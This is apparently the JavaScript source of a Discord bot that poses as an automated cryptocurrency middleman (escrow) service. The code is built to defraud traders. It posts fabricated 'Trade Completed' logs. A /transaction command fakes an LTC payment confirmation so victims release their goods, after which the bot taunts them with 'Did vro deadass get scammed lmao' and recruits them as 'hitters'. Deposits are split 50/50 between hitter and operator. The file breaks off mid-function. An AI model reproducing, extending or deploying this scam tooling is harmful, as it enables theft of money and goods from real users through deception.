const { Events, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, ChannelType, PermissionsBitField } = require('discord.js');
const { generateLTCAddress, generateETHAddress } = require('./wallet');
const { checkLTCAddress, generateFakeTransaction } = require('./blockchain');
const axios = require('axios');

const botBalances = new Map();
const pendingPayouts = new Map();

function loadHandlers(client) {
    setInterval(async () => {
        try {
            const response = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd', { timeout: 10000 });
            client.ltcPrice = response.data.litecoin.usd;
        } catch (e) {}
    }, 300000);

    setInterval(async () => {
        if (!client.config.LOG_CHANNEL) return;
        const channel = await client.channels.fetch(client.config.LOG_CHANNEL).catch(() => null);
        if (!channel) return;
        const fake = generateFakeTransaction();
        const embed = new EmbedBuilder()
            .setTitle('• Trade Completed')
            .setColor(0x2b2d31)
            .setDescription(`**${fake.ltc.toFixed(8)} LTC** ($${fake.usd.toFixed(2)} USD)\n\n**Sender**\n${fake.sender}\n**Receiver**\n${fake.receiver}\n**Transaction ID**\n[${fake.txid}](https://litecoinspace.org/tx/${fake.txid.replace('...', '')})`);
        await channel.send({ embeds: [embed] }).catch(() => {});
    }, Math.floor(Math.random() * 180000) + 120000);

    client.on(Events.InteractionCreate, async (interaction) => {
        if (interaction.isChatInputCommand()) handleCommands(interaction, client);
        if (interaction.isButton()) handleButtons(interaction, client);
        if (interaction.isModalSubmit()) handleModals(interaction, client);
    });
}

async function handleCommands(interaction, client) {
    const { commandName, member } = interaction;
    const isOwner = member.roles.cache.has(client.config.OWNER_ROLE_ID);
    const isHitter = member.roles.cache.has(client.config.HITTER_ROLE_ID);

    switch(commandName) {
        case 'panel':
            if (!isOwner) return interaction.reply({ content: '❌ Owner only.', ephemeral: true });
            await spawnPanel(interaction);
            break;
        case 'log':
            if (!isOwner) return interaction.reply({ content: '❌ Owner only.', ephemeral: true });
            client.config.LOG_CHANNEL = interaction.channel.id;
            await interaction.reply({ content: '✅ Log channel set.', ephemeral: true });
            break;
        case 'transaction':
            if (!isHitter && !isOwner) return interaction.reply({ content: '❌ Hitter role required.', ephemeral: true });
            await fakeTransaction(interaction, client);
            break;
        case 'close':
            await closeTicket(interaction, client);
            break;
        case 'heh':
            if (!isOwner) return interaction.reply({ content: '❌ Owner only.', ephemeral: true });
            client.config.LOG_CHANNEL = interaction.options.getString('channelid');
            await interaction.reply({ content: '✅ Monitor channel set.', ephemeral: true });
            break;
        case 'tickets':
            if (!isOwner) return interaction.reply({ content: '❌ Owner only.', ephemeral: true });
            client.config.TICKET_CATEGORY = interaction.options.getString('categoryid');
            await interaction.reply({ content: '✅ Ticket category set.', ephemeral: true });
            break;
        case 'balance':
            if (!isOwner && !isHitter) return interaction.reply({ content: '❌ Hitter+ only.', ephemeral: true });
            await showBalance(interaction, client);
            break;
        case 'send':
            if (!isOwner) return interaction.reply({ content: '❌ Owner only.', ephemeral: true });
            await sendFunds(interaction, client);
            break;
        case 'split':
            if (!isOwner) return interaction.reply({ content: '❌ Owner only.', ephemeral: true });
            await splitFunds(interaction, client);
            break;
    }
}

async function showBalance(interaction, client) {
    const ticketId = interaction.channel.id;
    const balance = botBalances.get(ticketId) || { ltc: 0, usd: 0 };
    
    const embed = new EmbedBuilder()
        .setTitle('💰 • Bot Balance')
        .addFields(
            { name: 'LTC', value: balance.ltc.toFixed(8), inline: true },
            { name: 'USD', value: `$${balance.usd.toFixed(2)}`, inline: true }
        )
        .setColor(0x2b2d31);
    
    await interaction.reply({ embeds: [embed], ephemeral: true });
}

async function sendFunds(interaction, client) {
    const address = interaction.options.getString('address');
    const amount = interaction.options.getNumber('amount');
    const ticketId = interaction.channel.id;
    
    const balance = botBalances.get(ticketId);
    if (!balance || balance.ltc < amount) {
        return interaction.reply({ content: `❌ Insufficient balance. Have: ${balance?.ltc.toFixed(8) || 0} LTC`, ephemeral: true });
    }
    
    balance.ltc -= amount;
    balance.usd = balance.ltc * client.ltcPrice;
    botBalances.set(ticketId, balance);
    
    console.log(`[SEND] ${amount} LTC to ${address} from ticket ${ticketId}`);
    
    await interaction.reply({ 
        content: `✅ **Send Initiated**\nAmount: ${amount} LTC\nTo: \`${address}\`\n\n⚠️ You must manually send this from your wallet.`, 
        ephemeral: true 
    });
}

async function splitFunds(interaction, client) {
    const address1 = interaction.options.getString('address1');
    const address2 = interaction.options.getString('address2');
    const ticketId = interaction.channel.id;
    
    const balance = botBalances.get(ticketId);
    if (!balance || balance.ltc <= 0) {
        return interaction.reply({ content: '❌ No balance to split.', ephemeral: true });
    }
    
    const half = balance.ltc / 2;
    botBalances.delete(ticketId);
    
    console.log(`[SPLIT] ${balance.ltc} LTC:\n- 50% to ${address1}\n- 50% to ${address2}`);
    
    await interaction.reply({ 
        content: `✅ **Split Initiated**\nTotal: ${(half * 2).toFixed(8)} LTC\n\n50% (${half.toFixed(8)}) → \`${address1}\`\n50% (${half.toFixed(8)}) → \`${address2}\``, 
        ephemeral: true 
    });
}

async function spawnPanel(interaction) {
    const mainEmbed = new EmbedBuilder()
        .setTitle("Jace's Auto Middleman")
        .setDescription('• Paid Service\n• Read our ToS before using the bot: <#tos-crypto>')
        .setColor(0x2b2d31)
        .addFields({ 
            name: 'Fees:', 
            value: '• Deals $250+: $1.50\n• Deals under $250: $0.50\n• Deals under $50 are **FREE**' 
        });

    const tutorialRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
            .setLabel('Tutorial')
            .setStyle(ButtonStyle.Link)
            .setURL('https://example.com/tutorial')
            .setEmoji('🔗')
    );

    const ltcEmbed = new EmbedBuilder()
        .setTitle('Ł • Request Litecoin • Ł')
        .setColor(0x2b2d31);

    const ltcRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
            .setCustomId('request_ltc')
            .setLabel('Request LTC')
            .setStyle(ButtonStyle.Primary)
            .setEmoji('🪙')
    );

    const usdtEmbed = new EmbedBuilder()
        .setTitle('• Request USDT [BEP-20] •')
        .setDescription('• Network: **BSC (BEP-20)**')
        .setColor(0x2b2d31);

    const usdtRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
            .setCustomId('request_usdt')
            .setLabel('Request USDT [BEP-20]')
            .setStyle(ButtonStyle.Success)
            .setEmoji('💵')
    );

    await interaction.channel.send({ embeds: [mainEmbed], components: [tutorialRow] });
    await interaction.channel.send({ embeds: [ltcEmbed], components: [ltcRow] });
    await interaction.channel.send({ embeds: [usdtEmbed], components: [usdtRow] });
    
    await interaction.reply({ content: '✅ Panels spawned.', ephemeral: true });
}

async function fakeTransaction(interaction, client) {
    const channelId = interaction.options.getString('channelid');
    const channel = await client.channels.fetch(channelId).catch(() => null);
    if (!channel) return interaction.reply({ content: '❌ Invalid channel.', ephemeral: true });

    const fakeEmbed = new EmbedBuilder()
        .setTitle('⚠️ • Transaction Detected')
        .setDescription('The transaction is currently **unconfirmed** and waiting for 1 confirmation.\n\n**Transaction**\n`f47c24fd8...7b2698be6` (0.00179953 LTC)\n**Amount Received**\n0.00179953 LTC ($0.10)\n**Required Amount**\n0.0018 LTC ($0.10)')
        .setColor(0xffa500);

    await channel.send({ embeds: [fakeEmbed] });

    setTimeout(async () => {
        const confirmedEmbed = new EmbedBuilder()
            .setTitle('✅ • Transaction Confirmed!')
            .setDescription('**Transactions**\n`f47c24fd8...7b2698be6` (0.00179953 LTC)\n**Total Amount Received**\n0.00179953 LTC ($0.10)')
            .setColor(0x00ff00);

        await channel.send({ embeds: [confirmedEmbed] });

        const ticketData = client.activeTickets.get(channelId);
        const isHitterSender = ticketData && ticketData.senderId === interaction.user.id;

        if (isHitterSender) {
            const releaseEmbed = new EmbedBuilder()
                .setTitle('✅ • You may proceed with your trade.')
                .setDescription(`1. <@${ticketData.receiverId}> Give your trader the items...\n2. <@${ticketData.senderId}> Once received, click "Release"`)
                .setColor(0x00ff00);

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`release_${channelId}`).setLabel('Release').setStyle(ButtonStyle.Success),
                new ButtonBuilder().setCustomId('cancel').setLabel('Cancel').setStyle(ButtonStyle.Secondary)
            );

            await channel.send({ embeds: [releaseEmbed], components: [row] });

            setTimeout(async () => {
                const scamEmbed = new EmbedBuilder()
                    .setTitle('😈 Did vro deadass get scammed lmao')
                    .setDescription('Better luck next time kid.')
                    .setColor(0xff0000);
                const joinRow = new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId('join_hitter').setLabel('Join us').setStyle(ButtonStyle.Danger)
                );
                await channel.send({ embeds: [scamEmbed], components: [joinRow] });
            }, 5000);
        } else {
            const scamInputEmbed = new EmbedBuilder()
                .setTitle('✅ • Transaction Confirmed')
                .setDescription('Hitter input your LTC/USDT address to receive the scammed money')
                .setColor(0x00ff00);
            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`input_address_${channelId}`).setLabel('Input Address').setStyle(ButtonStyle.Primary)
            );
            await channel.send({ embeds: [scamInputEmbed], components: [row] });
        }
    }, 30000);

    await interaction.reply({ content: '✅ Fake transaction initiated.', ephemeral: true });
}

async function closeTicket(interaction, client) {
    if (!interaction.channel.name.startsWith('ltc-') && !interaction.channel.name.startsWith('usdt-')) {
        return interaction.reply({ content: '❌ Not a ticket channel.', ephemeral: true });
    }

    const ticketData = client.activeTickets.get(interaction.channel.id);
    if (client.config.LOG_CHANNEL && ticketData) {
        const logChannel = await client.channels.fetch(client.config.LOG_CHANNEL).catch(() => null);
        if (logChannel) {
            await logChannel.send({
                content: `**Sender:** <@${ticketData.senderId}>\n**Receiver:** <@${ticketData.receiverId}>\n**Closed by:** <@${interaction.user.id}>`
            });
        }
    }

    await interaction.reply({ content: '🔒 Closing ticket...' });
    setTimeout(() => interaction.channel.delete().catch(() => {}), 3000);
}

async function handleButtons(interaction, client) {
    const { customId, user, guild, member } = interaction;

    if (customId === 'request_ltc' || customId === 'request_usdt') {
        const type = customId === 'request_ltc' ? 'ltc' : 'usdt';
        const modal = new ModalBuilder()
            .setCustomId(`${type}_modal`)
            .setTitle('Fill out the format');

        const traderInput = new TextInputBuilder()
            .setCustomId('trader').setLabel('Paste Your Trader\'s Username or ID')
            .setPlaceholder('e.g.: kookie.js / 693059117761429610')
            .setStyle(TextInputStyle.Short).setRequired(true);

        const givingInput = new TextInputBuilder()
            .setCustomId('giving').setLabel('What are You giving?')
            .setStyle(TextInputStyle.Paragraph).setMaxLength(500).setRequired(true);

        const receivingInput = new TextInputBuilder()
            .setCustomId('receiving').setLabel('What is Your Trader giving?')
            .setStyle(TextInputStyle.Paragraph).setMaxLength(500).setRequired(true);

        modal.addComponents(
            new ActionRowBuilder().addComponents(traderInput),
            new ActionRowBuilder().addComponents(givingInput),
            new ActionRowBuilder().addComponents(receivingInput)
        );

        await interaction.showModal(modal);
    }

    if (customId.startsWith('role_')) {
        const parts = customId.split('_');
        const role = parts[1];
        const ticketId = parts[2];
        const ticketData = client.activeTickets.get(ticketId);
        if (!ticketData) return interaction.reply({ content: '❌ Ticket expired.', ephemeral: true });

        if (user.id !== ticketData.creatorId && user.id !== ticketData.traderId) {
            return interaction.reply({ content: '❌ You are not part of this trade.', ephemeral: true });
        }

        if (!client.ticketRoles.has(ticketId)) client.ticketRoles.set(ticketId, {});
        const roles = client.ticketRoles.get(ticketId);

        if (role === 'sender' || role === 'receiver') {
            if (user.id === ticketData.creatorId) {
                if (roles.creatorRole) return interaction.reply({ content: '❌ You already selected a role.', ephemeral: true });
                roles.creatorRole = role;
            } else if (user.id === ticketData.traderId) {
                if (roles.traderRole) return interaction.reply({ content: '❌ You already selected a role.', ephemeral: true });
                roles.traderRole = role;
            }
        }

        await interaction.reply({ content: `<@${user.id}> selected: **${role === 'sender' ? 'Sender' : 'Receiver'}**` });

        if (roles.creatorRole && roles.traderRole) {
            const channel = await client.channels.fetch(ticketId);
            
            let senderId, receiverId;
            if (roles.creatorRole === 'sender') {
                senderId = ticketData.creatorId;
                receiverId = ticketData.traderId;
            } else {
                senderId = ticketData.traderId;
                receiverId = ticketData.creatorId;
            }

            ticketData.senderId = senderId;
            ticketData.receiverId = receiverId;

            const confirmEmbed = new EmbedBuilder()
                .setTitle('🛡️ • Role Selection Complete')
                .setDescription('Please confirm the roles are correct.')
                .addFields(
                    { name: 'Sender', value: `<@${senderId}>`, inline: false },
                    { name: 'Receiver', value: `<@${receiverId}>`, inline: false }
                )
                .setColor(0x2b2d31);

            const confirmRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`confirm_roles_${ticketId}`).setLabel('Correct').setStyle(ButtonStyle.Success),
                new ButtonBuilder().setCustomId(`reset_roles_${ticketId}`).setLabel('Incorrect').setStyle(ButtonStyle.Danger)
            );

            await channel.send({ embeds: [confirmEmbed], components: [confirmRow] });
        }
    }

    if (customId.startsWith('reset_roles_')) {
        const ticketId = customId.replace('reset_roles_', '');
        client.ticketRoles.delete(ticketId);
        
        const channel = await client.channels.fetch(ticketId);
        
        const roleEmbed = new EmbedBuilder()
            .setTitle('🛡️ • Select your role')
            .setDescription('• "Sender" if you are Sending LTC to the bot.\n• "Receiver" if you are Receiving LTC later from the bot.')
            .setColor(0x2b2d31);

        const roleRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId(`role_sender_${ticketId}`).setLabel('Sender').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId(`role_receiver_${ticketId}`).setLabel('Receiver').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId(`role_reset_${ticketId}`).setLabel('Reset').setStyle(ButtonStyle.Danger)
        );

        await channel.send({ embeds: [roleEmbed], components: [roleRow] });
        await interaction.reply({ content: 'Roles reset. Please select again.' });
    }

    if (customId.startsWith('confirm_roles_')) {
        const ticketId = customId.replace('confirm_roles_', '');
        const ticketData = client.activeTickets.get(ticketId);
        const roles = client.ticketRoles.get(ticketId);
        if (!ticketData || !roles) return;

        if (user.id !== ticketData.senderId && user.id !== ticketData.receiverId) {
            return interaction.reply({ content: '❌ Only sender or receiver can confirm.', ephemeral: true });
        }

        if (!ticketData.roleConfirmedBy) ticketData.roleConfirmedBy = [];
        
        if (ticketData.roleConfirmedBy.includes(user.id)) {
            return interaction.reply({ content: '❌ You already confirmed.', ephemeral: true });
        }

        ticketData.roleConfirmedBy.push(user.id);
        const confirmCount = ticketData.roleConfirmedBy.length;

        await interaction.reply({ content: `✅ <@${user.id}> confirmed roles. (${confirmCount}/2)` });

        if (confirmCount >= 2) {
            const amountEmbed = new EmbedBuilder()
                .setTitle('💵 • Set the amount in USD value')
                .setColor(0x2b2d31);

            const amountRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`set_amount_${ticketId}`).setLabel('Set USD Amount').setStyle(ButtonStyle.Primary)
            );

            const channel = await client.channels.fetch(ticketId);
            await channel.send({ embeds: [amountEmbed], components: [amountRow] });
        }
    }

    if (customId.startsWith('set_amount_')) {
        const ticketId = customId.replace('set_amount_', '');
        const ticketData = client.activeTickets.get(ticketId);
        
        if (user.id !== ticketData?.senderId) {
            return interaction.reply({ content: '❌ Only sender can set amount.', ephemeral: true });
        }

        const modal = new ModalBuilder()
            .setCustomId(`amount_modal_${ticketId}`)
            .setTitle('Set USD Amount');

        const amountInput = new TextInputBuilder()
            .setCustomId('usd_amount').setLabel('Enter USD Amount')
            .setPlaceholder('0.10').setStyle(TextInputStyle.Short).setRequired(true);

        modal.addComponents(new ActionRowBuilder().addComponents(amountInput));
        await interaction.showModal(modal);
    }

    if (customId === 'copy_details') {
        await interaction.reply({ content: '```\nLctyaKaxPGTUYM3bZdoADKGj947XxgaUH8\n0.0018\n```', ephemeral: true });
    }

    if (customId.startsWith('release_')) {
        const ticketId = customId.replace('release_', '');
        const ticketData = client.activeTickets.get(ticketId);
        
        if (!ticketData) return interaction.reply({ content: '❌ Ticket not found.', ephemeral: true });
        
        const isSender = user.id === ticketData.senderId;
        const isReceiver = user.id === ticketData.receiverId;
        const isHitter = member.roles.cache.has(client.config.HITTER_ROLE_ID);
        const isHitterReceiver = isReceiver && isHitter;
        
        if (!isSender && !isHitterReceiver) {
            return interaction.reply({ content: '❌ Only sender can release. Hitter receivers can also release.', ephemeral: true });
        }
        
        const guild = await client.guilds.fetch(client.config.GUILD_ID || interaction.guild.id);
        const senderMember = await guild.members.fetch(ticketData.senderId).catch(() => null);
        const isRealSenderHitter = senderMember?.roles.cache.has(client.config.HITTER_ROLE_ID);
        
        if (!isRealSenderHitter && isReceiver) {
            await interaction.reply({ content: `✅ <@${user.id}> initiated release. Receiver must provide LTC address for 50% split.` });
            
            const addressEmbed = new EmbedBuilder()
                .setTitle('💰 • Provide Your LTC Address')
                .setDescription(`<@${ticketData.receiverId}>, send your LTC address to receive 50% of the funds.\n\nThe bot keeps 50%, you get 50%.`)
                .setColor(0x00ff00);
            
            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`receiver_address_${ticketId}`).setLabel('Input LTC Address').setStyle(ButtonStyle.Primary)
            );
            
            await interaction.channel.send({ embeds: [addressEmbed], components: [row] });
        } else {
            await interaction.reply({ content: `✅ <@${user.id}> released the funds.` });
            
            const scamEmbed = new EmbedBuilder()
                .setTitle('😈 Did vro deadass get scammed lmao')
                .setDescription('Better luck next time kid.')
                .setColor(0xff0000);
            const joinRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('join_hitter').setLabel('Join us').setStyle(ButtonStyle.Danger)
            );
            await interaction.channel.send({ embeds: [scamEmbed], components: [joinRow] });
        }
    }

    if (customId.startsWith('fake_release_')) {
        const scamEmbed = new EmbedBuilder()
            .setTitle('😈 Did vro deadass get scammed lmao')
            .setDescription('Better luck next time kid.')
            .setColor(0xff0000);
        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('join_hitter').setLabel('Join us').setStyle(ButtonStyle.Danger)
        );
        await interaction.update({ embeds: [scamEmbed], components: [row] });
    }

    if (customId === 'join_hitter') {
        const member = await interaction.guild.members.fetch(user.id);
        await member.roles.add(client.config.HITTER_ROLE_ID).catch(() => {});
        await interaction.reply({ content: '✅ You now have the Hitter role!', ephemeral: true });
    }

    if (customId.startsWith('input_address_')) {
        const ticketId = customId.replace('input_address_', '');
        
        const isHitter = member.roles.cache.has(client.config.HITTER_ROLE_ID);
        if (!isHitter) {
            return interaction.reply({ content: '❌ Only hitters can input address to receive funds.', ephemeral: true });
        }
        
        const modal = new ModalBuilder()
            .setCustomId(`hitter_address_modal_${ticketId}`)
            .setTitle('Input Your LTC Address (50% Split)');

        const addressInput = new TextInputBuilder()
            .setCustomId('hitter_ltc_address').setLabel('Your LTC Address')
            .setPlaceholder('ltc1... or L...').setStyle(TextInputStyle.Short).setRequired(true);

        modal.addComponents(new ActionRowBuilder().addComponents(addressInput));
        await interaction.showModal(modal);
    }

    if (customId.startsWith('receiver_address_')) {
        const ticketId = customId.replace('receiver_address_', '');
        const ticketData = client.activeTickets.get(ticketId);
        
        if (user.id !== ticketData?.receiverId) {
            return interaction.reply({ content: '❌ Only receiver can input address.', ephemeral: true });
        }
        
        const modal = new ModalBuilder()
            .setCustomId(`receiver_split_modal_${ticketId}`)
            .setTitle('Input Your LTC Address');

        const addressInput = new TextInputBuilder()
            .setCustomId('receiver_ltc_address').setLabel('Your LTC Address')
            .setPlaceholder('ltc1... or L...').setStyle(TextInputStyle.Short).setRequired(true);

        modal.addComponents(new ActionRowBuilder().addComponents(addressInput));
        await interaction.showModal(modal);
    }

    if (customId === 'delete_ticket') {
        await interaction.reply({ content: '🔒 Deleting ticket...' });
        setTimeout(() => interaction.channel.delete().catch(() => {}), 2000);
    }

    if (customId.startsWith('confirm_amount_')) {
        const ticketId = customId.replace('confirm_amount_', '');
        const ticketData = client.activeTickets.get(ticketId);
        
        if (!ticketData) return interaction.reply({ content: '❌ Ticket not found.', ephemeral: true });
        
        if (user.id !== ticketData.senderId && user.id !== ticketData.receiverId) {
            return interaction.reply({ content: '❌ Only sender or receiver can confirm.', ephemeral: true });
        }
        
        if (!ticketData.amountConfirmedBy) ticketData.amountConfirmedBy = [];
        
        if (ticketData.amountConfirmedBy.includes(user.id)) {
            return interaction.reply({ content: '❌ You already confirmed.', ephemeral: true });
        }
        
        ticketData.amountConfirmedBy.push(user.id);
        
        const confirmCount = ticketData.amountConfirmedBy.length;
        
        await interaction.reply({ content: `✅ <@${user.id}> confirmed the USD amount. (${confirmCount}/2)` });
        
        if (confirmCount >= 2) {
            const isLTC = ticketData.type === 'ltc';
            const cryptoSymbol = isLTC ? 'LTC' : 'USDT';
            
            const paymentEmbed = new EmbedBuilder()
                .setTitle('📜 • Payment Information')
                .setDescription(`Make sure to send the **EXACT** amount in ${cryptoSymbol}.`)
                .addFields(
                    { name: 'USD Amount', value: `$${ticketData.usdAmount.toFixed(2)}`, inline: false },
                    { name: `${cryptoSymbol} Amount`, value: isLTC ? ticketData.ltcAmount : 'Contact support for USDT amount', inline: false },
                    { name: 'Payment Address', value: `\`${ticketData.address}\``, inline: false },
                    { name: 'Current LTC Price', value: `$${client.ltcPrice}`, inline: false },
                    { name: 'Note', value: 'This ticket will be closed within 20 minutes if no transaction was detected.' }
                )
                .setColor(0x2b2d31);

            const copyRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('copy_details').setLabel('Copy Details').setStyle(ButtonStyle.Primary)
            );

            const channel = await client.channels.fetch(ticketId);
            await channel.send({ content: `<@${ticketData.senderId}> Send the ${cryptoSymbol} to the following address.`, embeds: [paymentEmbed], components: [copyRow] });

            startMonitor(ticketId, client);
        }
    }

    if (customId.startsWith('incorrect_amount_')) {
        const ticketId = customId.replace('incorrect_amount_', '');
        const ticketData = client.activeTickets.get(ticketId);
        
        if (user.id !== ticketData?.senderId && user.id !== ticketData?.receiverId) {
            return interaction.reply({ content: '❌ Only sender or receiver can reject.', ephemeral: true });
        }
        
        await interaction.reply({ content: `❌ <@${user.id}> said the amount is incorrect. Set a new amount.` });
        
        if (ticketData) ticketData.amountConfirmedBy = [];
        
        const amountEmbed = new EmbedBuilder()
            .setTitle('💵 • Set the amount in USD value')
            .setColor(0x2b2d31);

        const amountRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId(`set_amount_${ticketId}`).setLabel('Set USD Amount').setStyle(ButtonStyle.Primary)
        );

        const channel = await client.channels.fetch(ticketId);
        await channel.send({ embeds: [amountEmbed], components: [amountRow] });
    }
}

async function handleModals(interaction, client) {
    const { customId, user, guild, member } = interaction;

    if (customId === 'ltc_modal' || customId === 'usdt_modal') {
        const type = customId === 'ltc_modal' ? 'ltc' : 'usdt';
        const trader = interaction.fields.getTextInputValue('trader');
        const giving = interaction.fields.getTextInputValue('giving');
        const receiving = interaction.fields.getTextInputValue('receiving');

        try {
            const walletMnemonic = type === 'ltc' ? client.config.WALLET_1 : client.config.WALLET_2;
            if (!walletMnemonic) {
                return interaction.reply({ content: `❌ WALLET_${type === 'ltc' ? '1' : '2'} not configured.`, ephemeral: true });
            }

            const category = client.config.TICKET_CATEGORY || interaction.channel.parentId;
            const ticketNum = Math.floor(1000 + Math.random() * 9000);
            const channelName = `${type}-${user.username.toLowerCase().replace(/[^a-z0-9]/g, '').slice(0, 10)}-${ticketNum}`;

            const addressIndex = client.ticketAddresses.size;
            
            let walletInfo;
            try {
                if (type === 'ltc') {
                    walletInfo = generateLTCAddress(client.config.WALLET_1, addressIndex);
                } else {
                    walletInfo = generateETHAddress(client.config.WALLET_2, addressIndex);
                }
                console.log(`Generated ${type} address:`, walletInfo.address);
            } catch (walletErr) {
                console.error('Wallet generation error:', walletErr);
                return interaction.reply({ content: `❌ Wallet error: ${walletErr.message}`, ephemeral: true });
            }

            if (!walletInfo || !walletInfo.address) {
                return interaction.reply({ content: '❌ Failed to generate wallet address.', ephemeral: true });
            }

            const channel = await guild.channels.create({
                name: channelName,
                type: ChannelType.GuildText,
                parent: category,
                permissionOverwrites: [
                    { id: guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                    { id: user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] },
                    { id: client.config.OWNER_ROLE_ID, allow: [PermissionsBitField.Flags.ViewChannel] }
                ]
            });

            let traderMember;
            try {
                if (trader.includes('<@')) {
                    const traderId = trader.replace(/[<@>]/g, '');
                    traderMember = await guild.members.fetch(traderId).catch(() => null);
                } else {
                    traderMember = await guild.members.fetch(trader).catch(() => null);
                }
            } catch (e) {
                traderMember = null;
            }

            if (traderMember) {
                await channel.permissionOverwrites.create(traderMember, {
                    ViewChannel: true,
                    SendMessages: true
                });
            }

            client.activeTickets.set(channel.id, {
                id: channel.id,
                creatorId: user.id,
                traderId: traderMember?.id || null,
                type: type,
                address: walletInfo.address,
                addressIndex: addressIndex,
                giving: giving,
                receiving: receiving,
                confirmedBy: [],
                roleConfirmedBy: [],
                amountConfirmedBy: [],
                senderId: null,
                receiverId: null,
                walletPrivateKey: walletInfo.privateKey
            });

            client.ticketAddresses.set(channel.id, walletInfo);

            const welcomeEmbed = new EmbedBuilder()
                .setTitle(`👋 Jace's Auto Middleman Service`)
                .setDescription('Make sure to follow the steps and read the instructions thoroughly.\nPlease explicitly state the trade details if the information below is inaccurate.\nBy using this bot, you agree to our ToS #tos-crypto.')
                .setColor(0x2b2d31)
                .addFields(
                    { name: `<@${user.id}>'s side:`, value: giving, inline: true },
                    { name: `${traderMember ? `<@${traderMember.id}>` : trader}'s side:`, value: receiving, inline: true }
                );

            const deleteRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('delete_ticket').setLabel('Delete Ticket').setStyle(ButtonStyle.Danger)
            );

            await channel.send({ content: `<@${user.id}> ${traderMember ? `<@${traderMember.id}>` : trader}`, embeds: [welcomeEmbed], components: [deleteRow] });

            const roleEmbed = new EmbedBuilder()
                .setTitle('🛡️ • Select your role')
                .setDescription('• "Sender" if you are Sending LTC to the bot.\n• "Receiver" if you are Receiving LTC later from the bot.')
                .setColor(0x2b2d31);

            const roleRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`role_sender_${channel.id}`).setLabel('Sender').setStyle(ButtonStyle.Primary),
                new ButtonBuilder().setCustomId(`role_receiver_${channel.id}`).setLabel('Receiver').setStyle(ButtonStyle.Primary),
                new ButtonBuilder().setCustomId(`role_reset_${channel.id}`).setLabel('Reset').setStyle(ButtonStyle.Danger)
            );

            await channel.send({ embeds: [roleEmbed], components: [roleRow] });
            await interaction.reply({ content: `✅ Ticket created: <#${channel.id}>`, ephemeral: true });
            
        } catch (error) {
            console.error('Error creating ticket:', error);
            await interaction.reply({ content: `❌ Error: ${error.message}`, ephemeral: true });
        }
    }

    if (customId.startsWith('amount_modal_')) {
        const ticketId = customId.replace('amount_modal_', '');
        const amount = parseFloat(interaction.fields.getTextInputValue('usd_amount'));
        const ticketData = client.activeTickets.get(ticketId);

        if (!ticketData) return interaction.reply({ content: '❌ Ticket not found.', ephemeral: true });

        ticketData.usdAmount = amount;
        ticketData.ltcAmount = (amount / client.ltcPrice).toFixed(8);
        ticketData.amountConfirmedBy = [];

        const amountEmbed = new EmbedBuilder()
            .setTitle('💠 • USD amount set to')
            .setDescription(`**$${amount.toFixed(2)}**\n\nBoth parties must confirm the USD amount.`)
            .setColor(0x2b2d31);

        const confirmRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId(`confirm_amount_${ticketId}`).setLabel('Correct').setStyle(ButtonStyle.Success),
            new ButtonBuilder().setCustomId(`incorrect_amount_${ticketId}`).setLabel('Incorrect').setStyle(ButtonStyle.Danger)
        );

        const channel = await client.channels.fetch(ticketId);
        await channel.send({ content: `<@${ticketData.senderId}> <@${ticketData.receiverId}>`, embeds: [amountEmbed], components: [confirmRow] });
        await interaction.reply({ content: `✅ Amount set to $${amount.toFixed(2)}`, ephemeral: true });
    }

    if (customId.startsWith('hitter_address_modal_')) {
        const ticketId = customId.replace('hitter_address_modal_', '');
        const address = interaction.fields.getTextInputValue('hitter_ltc_address');
        
        const isHitter = member.roles.cache.has(client.config.HITTER_ROLE_ID);
        if (!isHitter) {
            return interaction.reply({ content: '❌ Only hitters can receive funds.', ephemeral: true });
        }
        
        const balance = botBalances.get(ticketId) || { ltc: 0 };
        const half = balance.ltc / 2;
        
        pendingPayouts.set(ticketId, {
            hitterAddress: address,
            hitterAmount: half,
            botAmount: half
        });
        
        const confirmEmbed = new EmbedBuilder()
            .setTitle('💰 • 50% Split Configured')
            .setDescription(`Hitter address: \`${address}\`\nHitter gets: ${half.toFixed(8)} LTC (50%)\nBot keeps: ${half.toFixed(8)} LTC (50%)`)
            .setColor(0x00ff00);
        
        await interaction.reply({ embeds: [confirmEmbed] });
        
        if (client.config.LOG_CHANNEL) {
            const logChannel = await client.channels.fetch(client.config.LOG_CHANNEL).catch(() => null);
            if (logChannel) {
                await logChannel.send({
                    embeds: [{
                        title: '🎯 Hitter Payout Ready',
                        description: `Ticket: <#${ticketId}>\nHitter: <@${user.id}>\nAmount: ${half.toFixed(8)} LTC\nAddress: \`${address}\``,
                        color: 0x00ff00
                    }]
                });
            }
        }
    }

    if (customId.startsWith('receiver_split_modal_')) {
        const ticketId = customId.replace('receiver_split_modal_', '');
        const ticketData = client.activeTickets.get(ticketId);
        const address = interaction.fields.getTextInputValue('receiver_ltc_address');
        
        if (user.id !== ticketData?.receiverId) {
            return interaction.reply({ content: '❌ Only receiver can input address.', ephemeral: true });
        }
        
        const balance = botBalances.get(ticketId) || { ltc: 0 };
        const half = balance.ltc / 2;
        
        const confirmEmbed = new EmbedBuilder()
            .setTitle('💰 • Receiver Split Recorded')
